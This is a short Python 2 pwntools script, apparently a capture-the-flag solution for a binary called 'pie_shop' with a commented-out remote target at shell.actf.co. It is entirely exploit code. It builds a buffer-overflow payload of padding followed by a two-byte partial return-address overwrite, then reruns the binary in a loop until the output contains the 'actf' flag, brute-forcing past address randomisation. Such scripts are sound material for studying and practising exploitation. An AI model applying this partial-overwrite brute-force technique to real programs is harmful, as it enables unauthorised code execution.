from pwn import *
pay="apple\x00\x00\x00"
pay+='\x00'*0x40
pay+='\xa9\x21'

while(1):
	#r=remote('shell.actf.co',19306)
	r=process("./pie_shop")
	r.sendline(pay)
	sleep(1)
	B=r.recv()
	print(B)
	if 'actf' in B:
		print B
		break
	r.close()
